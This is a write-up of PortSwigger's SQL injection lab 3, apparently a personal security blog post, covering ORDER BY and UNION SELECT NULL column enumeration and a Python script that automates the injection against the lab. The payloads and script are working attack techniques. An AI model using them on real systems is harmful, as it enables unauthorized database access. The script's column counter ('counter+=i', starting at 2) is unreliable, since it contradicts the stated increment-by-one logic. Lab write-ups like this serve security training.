+++
title = "SQLi Vulnerabilities: Lab 3: SQL injection UNION attack, determining the number of columns returned by the query"
date = 2025-11-12
lastmod = 2025-11-12
draft = false
author = "bloodstiller"
description = "PortSwigger sqli lab write-up UNION Attack exfiltrate data" 
tags = [
  "WebSecurity",
  "PortSwigger",
  "web-exploitation",
  "security-research",
  "portswigger-labs",
  "ctf-writeup",
  "injection",
  "sql",
  "sqli",
  "python",
  "UNION"
]
keywords = [
  "authentication vulnerabilities",
  "SQL",
  "SQLi",
  "PortSwigger authentication lab",
  "web security"
]
toc = true
bold = true
next = true
+++

## Lab 3: SQL injection UNION attack, determining the number of columns returned by the query: {#lab-3-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query}

> This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.
>
> To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values.


### Initial Reconnaissance/Discovery: {#initial-reconnaissance-discovery}

Looking at the page we can see there are a list of products displayed in a table and we can further filter these by using the search category selector.
![](/ox-hugo/2025-11-12_05-51.png)
If we filter for the a category we can see this is passed as a parameter in the url.
![](/ox-hugo/2025-11-12_05-52.png)


### Establishing SQLi: {#establishing-sqli}

If we send the request to repeater we can inject a single quote `'` after the parameter and see we trigger a `500` Error response.
![](/ox-hugo/2025-11-12_05-54.png)

If then add a single another quote we can see that the page renders correctly.
![](/ox-hugo/2025-11-12_05-55_1.png)


### Inferring The SQL Query Being Run: {#inferring-the-sql-query-being-run}

Looking at the way the page we can infer the query being run is similar to the below.

```sql
SELECT * FROM products WHERE category = 'Pets' AND [rest of query]
```

When we add our single quote it becomes the below which is syntactically incorrect.

```sql
SELECT * FROM products WHERE category = 'Pets'' AND [rest of query]
```

However when we add another quote it becomes the below, closing off the first quotation mark we provided.

```sql
SELECT * FROM products WHERE category = 'Pets''' AND [rest of query]
```


### UNION Query Requirements: {#union-query-requirements}

As the lab wants us to display the data using a `UNION SELECT` query we also need to ensure that the two requirements for this attack are met:

1.  **The queries must return the same amount of columns**:
    This means that if the original query that is searching the database returns 5 columns our `UNION` query must also return 5 columns.
    -   **To solve this issue**: We will enumerate the number of columns being returned by the original query.
2.  **The data types in the columns must be compatible with each query**:
    This means that if the table is returning strings such as item names in column 1 our `UNION` query has to also return strings or a compatible data type.
    -   **To solve this issue**: We will use a simple method of returning `NULL` values in this case. This is because `NULL` is convertible/compatible to every data type, so it will mean that the payload should succeed.


### Enumerating The Number Of Columns Using ORDER BY Method: {#enumerating-the-number-of-columns-using-order-by-method}

In order for us to fulfill the labs requirements we need to display an additional column with `NULL` values, however for us to do that we need to establish how many columns there are in the table being pulled from. We can do this using the `ORDER BY` method.

This works, by modifying the original query to order the returned results by different columns in the results. This works particularly well as we can just specify a column number we want to order by meaning we don't need to know the names of the columns themselves.

What is also useful is that when we exceed the number of columns available this will cause an error meaning that if submit order by payloads and they all return 200 up until we hit `ORDER BY 15--` we know that the total number of columns is 14.


#### Burp Suite ORDER By Enumeration: {#burp-suite-order-by-enumeration}

In burpsuite we can place the payload below after the category

```sql
'+ORDER+BY+1--
```

{{< figure src="/ox-hugo/2025-11-12_06-21.png" >}}

We then increment the number up until we get an error, in this case `4` returned an error meaning that the table has a total of 3 columns.
![](/ox-hugo/2025-11-12_06-39.png)


### Displaying The Data Using UNION SELECT: {#displaying-the-data-using-union-select}

Now we have the total number of columns this means we can use `UNION SELECT` to display the data.

As the table has three columns we will use the payload below.

```sql
' UNION SELECT NULL,NULL,NULL--
```

As we can see it worked and an additional row is present containing no values.
![](/ox-hugo/2025-11-12_06-27.png)

If we remove the `UNION SELECT` query we can see the row is removed.
![](/ox-hugo/2025-11-12_06-28.png)

+Note+: It is also possible to complete this lab just using the `UNION SELECT` method and increasing the number of columns by incrementing the `NULL` value.


### Solving The Whole Lab With Python. {#solving-the-whole-lab-with-python-dot}


#### Prep The Certificate: {#prep-the-certificate}

If you want to proxy traffic through burp this is mandatory.

Open burp's in built web browser and go to <http://burpsuite> &amp; download the certificate by clicking on “CA Certificate” button on the top right corner.
![](/ox-hugo/2025-11-06_05-56.png)

Convert the certificate to the `.pem` format so the python requests module can use it.

```shell
openssl x509 -inform der -in certificate.cer -out certificate.pem
```


#### Imports: {#imports}

First we import the modules we will need, `requests` &amp; `os`. We also suppress the `requests` warning that will show.

```python
import requests
import os
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
```

If we didn't suppress the warnings the output would look like this.
![](/ox-hugo/2025-11-06_06-02.png)


#### Proxy Setup: {#proxy-setup}

Now we declare our proxy so we can push all our traffic through burp, we also pass in the converted certificate.

```python
proxy = 'http://127.0.0.1:8080'
os.environ['HTTP_PROXY'] = proxy
os.environ['HTTPS_PROXY'] = proxy
os.environ['REQUESTS_CA_BUNDLE'] = "certificate.pem"
```


#### Variable Declaration: {#variable-declaration}


##### Proxies &amp; URL: {#proxies-and-url}

We declare an array of proxies to proxy our requests through as well as the unique url &amp; category endpoint.
+Note+: The category and URL vary from instance to instance.

```python
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
url="https://0a5200e704e3800f80b0e46100b00036.web-security-academy.net/filter?category=Accessories"
```


##### SQL Syntax &amp; Counters: {#sql-syntax-and-counters}

So now we have our payload broken up into various elements, the reason for this is because we don't want to just supply a list of multiple `UNION SELECT` statements, doing it this way offers more flexibility as well as ensuring we don't repeat ourselves, it also means we could check databases with thousands of columns and it would still work.(I wouldn't advise that but you could)

We also create a `counter` variable and set it to `2`. This `counter` is used to track how many `NULL` values (columns) are in our `UNION SELECT` payload as we build it. Our starting payload is:

```python
payload = union + nullPayload # "' UNION SELECT NULL"
```

So before the loop runs we already have one `NULL` in the query. Inside the loop, we keep appending more `,NULL` values to `payload` and update `counter` to reflect the number of columns.

We don’t start the `counter` at `0` because SQL columns are conceptually counted from 1 (first column, second column etc&#x2026;) and our payload already includes the first `NULL` column. If we started from 0, the value of `counter` would always lag behind the actual number of `NULL` columns in the query. By starting at `2`, the value of `counter` stays aligned with the true column count once we begin adding additional `NULL` values in the loop.

```python
union="' UNION SELECT "
comma=","
nullPayload="NULL"
comment="--"
additionalNull=comma+nullPayload
payload=union+nullPayload
counter=2
```


#### For Loop With Request: {#for-loop-with-request}

We declare a for loop will which repeat for 10 total iterations.

Then we have a `try` block which will send our get request to the `url` with `payload` &amp; `comment`.

**Response Monitoring**: We then monitor the responses and if the value "My account" is found in the body of the response we will:

-   Print the string `"Valid payload {payload}-- there are {counter} columns."` which will contain the actual payload as well as the number of columns.
-   Print the full Lab URL including comment and payload so we can easily verify it in a browser.

If thesee above conditions are met it will `break` out of the loop and stop the process.

If the above is not found it will add an additional `NULL` value using the `additionalNull` variable to the payload &amp; increment the `counter` by `1` and continue.

```python
for i in range(10):
    try:
        request=requests.get(url + payload + comment, proxies=proxies, verify=False, timeout=3)
        if 'My account' in request.text:
           print(f"Valid payload {payload}-- there are {counter} columns.")
           print(f"Lab Url: {url+payload+comment}")
           break
        payload=payload+additionalNull
        counter+=i
```


#### Error Handling: {#error-handling}

These `except` clauses are used for error handling to ensure if an error is encountered they are logged to the terminal and the process continues.

```python
    except requests.exceptions.HTTPError as errh:
        print ("Http Error:",errh)
    except requests.exceptions.ConnectionError as errc:
        print ("Error Connecting:",errc)
    except requests.exceptions.Timeout as errt:
        print ("Timeout Error:",errt)
    except requests.exceptions.RequestException as err:
        print ("OOps: Something Else",err)
```


### Full Script: {#full-script}

```python
#!/usr/bin/env python3
import requests
import os
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
proxy = 'http://127.0.0.1:8080'
os.environ['HTTP_PROXY'] = proxy
os.environ['HTTPS_PROXY'] = proxy
os.environ['REQUESTS_CA_BUNDLE'] = "certificate.pem"

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
url="https://0a5200e704e3800f80b0e46100b00036.web-security-academy.net/filter?category=Accessories"

union="' UNION SELECT "
comma=","
nullPayload="NULL"
comment="--"
additionalNull=comma+nullPayload
payload=union+nullPayload
counter=2

for i in range(10):
    try:
        request=requests.get(url + payload + comment, proxies=proxies, verify=False, timeout=3)
        if 'My account' in request.text:
           print(f"Valid payload {payload}-- there are {counter} columns.")
           print(f"Lab Url: {url+payload+comment}")
           break
        payload=payload+additionalNull
        counter+=i

    except requests.exceptions.HTTPError as errh:
        print ("Http Error:",errh)
    except requests.exceptions.ConnectionError as errc:
        print ("Error Connecting:",errc)
    except requests.exceptions.Timeout as errt:
        print ("Timeout Error:",errt)
    except requests.exceptions.RequestException as err:
        print ("OOps: Something Else",err)
```


### Executing The Python Script To Solve The Lab: {#executing-the-python-script-to-solve-the-lab}

As we can see we solve the lab and can see that the valid number of columns is `3`
![](/ox-hugo/2025-11-12_10-11.png)
We are also given the concatenated URL &amp; visiting it will show the `NULL` row.
![](/ox-hugo/2025-11-12_10-13.png)
